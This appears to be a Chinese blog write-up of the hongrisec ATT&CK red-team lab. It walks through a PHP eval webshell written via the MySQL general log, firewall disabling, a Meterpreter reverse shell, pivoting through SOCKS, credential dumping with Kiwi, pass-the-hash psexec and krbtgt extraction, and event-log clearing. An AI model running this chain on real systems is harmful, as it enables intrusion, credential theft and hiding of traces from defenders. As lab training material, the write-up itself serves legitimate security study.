ATT&CK红队一

2026/10/19 靶机 渗透 
    ## 靶场安装

下载地址：漏洞详情

网络配置：

win2k3

win7

这里一开始添加了一个网络适配器开自定义用来连接内网，我这台虚拟机好像给第一个网络适配器绑定了内网ip所以把第一个改成自定义(vmnet1),再添加一个网络适配器开nat模式用来连接外网。

win2008

phpstudy启动

靶场默认密码：hongrisec@2019
在c盘中启动phpstudy（第一次打开虚拟机需要重新启动一次）。

靶场练习

先用nmap对当前网段进行存活主机扫描。

nmap -sn 192.168.179.0/24

发现目标主机，进行端口扫描看一下开启了什么服务。

nmap -p- --min-rate 10000 192.168.179.143

用dirseach对80端口进行扫描。

dirsearch -u 192.168.179.143:80

扫描到后台，打开浏览器查看一下。

尝试弱密码root/root，成功进入后台

这里得想办法拿到shell，查询历史版本没有查到漏洞，只能用phpmyadmin去利用mysql写日志写马。

show global variables like '%general%';

查看一下日志是否开启。

这里显示关闭状态，先把日志打开。

set global general_log='on';

查看mysql路径。

select @@basedir;


设置木马路径。

set global general_log_file ="C:/phpStudy/WWW/shell.php"

写入shell。

select "<?php eval($_POST['a'])?>"

用蚁剑连接shell。

whoami查看一下权限。

先把防火墙关了避免影响到后面的步骤。

netsh advfirewall set allprofiles state off

因为webshell难以支持内网横向移动的要求，所以这里需要利用webshell在win7主机创建一个Meterpreter 反向 Shell。

用msfvenom创建一个shell文件。

msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.179.135  lport=5566 -f exe -o shell.exe

用蚁剑上传到win7。

在kali上建立监听端口。

msfconsole

use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 192.168.179.143
set lport 5566
run -j

要去蚁剑里面用命令让shell.exe运行起来，打开蚁剑找到上传shell.exe的目录。

start shell.exe


成功连接到win7中的shell.exe。

sessions -i 1     #进入会话1

shell             #使用shell

先判断是否存在域

ipconfig /all


发现存在域，god.org,接下来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息。先解决shell回显会乱码的问题，chcp 65001把 cmd 的输出代码页切成 UTF-8，与 msfconsole 终端对齐，中文就能正常显示。

chcp 65001

再执行

net config workstation

查看一下有几个域。

发现只有god一个域，查一下域控主机名。

net group "Domain Controllers" /domain

ping一下域控主机域名OWA.god.org，拿到主控域名的IP地址。

ping OWA.god.org

现在做的信息收集是利用shell在win7上进行的，接下来建立路由让攻击机也能够访问内网，先退回到msf。

exit           #退到meterpreter >

background     #退到msf>

添加内网路由。

route add 192.168.52.0/24 会话id

route print    #检查路由是否生效


再建立socks代理。

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

现在可以在内网使用nmap等工具了，先对域控进行nmap扫描。

nmap -sV -p 88,389,445,3389,5985 192.168.52.138

这里显示filtered，换种方式用msf自带的tcp扫描器扫一遍端口。

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.52.138
set PORTS 1-10000
set THREADS 10
set TIMEOUT 1
run

这里扫一遍太慢了，打靶场没有必要全扫描在这种地方浪费太多时间不值得。可以用下面这个命令对开放端口扫描验证一下就行了，重点是会用这个扫描，而不是把靶场端口全扫一遍。

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.52.138
set PORTS 88,389,445,3389
run

进行版本探测。

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.52.138
run

返回会话3，启动kiwi提取凭据。

sessions -i 3
load kiwi
creds_all

还没拿到system，权限不够，之前已经拿到Administrator了，所以直接getsystem应该可以拿到system。

这里还有问题，Meterpreter 载荷是 32 位，32 位的 Kiwi 模块无法读取 64 位进程，这里得给他迁移到64位进程，用ps命令找一个x64的进程。

migrate 你想迁移的进程

再跑一次kiwi拿凭证。

用impacket-psexec创建shell连接，要走之前创的socks不然走不通。

proxychains4 impacket-psexec god.org/Administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:d66092bee9345cd31e42ed5b70ebc6d7

获取krbtgt哈希，重新打开新的终端输入。

proxychains4 impacket-secretsdump god.org/Administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:d66092bee9345cd31e42ed5b70ebc6d7 -just-dc-user krbtgt

痕迹清除

这里可以执行下面的命令进行痕迹清除。

wevtutil cl security               // 清理安全日志
wevtutil cl system                 // 清理系统日志
wevtutil cl application            // 清理应用程序日志
wevtutil cl "windows powershell"   // 清除 PowerShell 日志
wevtutil cl Setup                  // 清除 Setup 事件日志

但是这种方式会让windows生成1102事件。
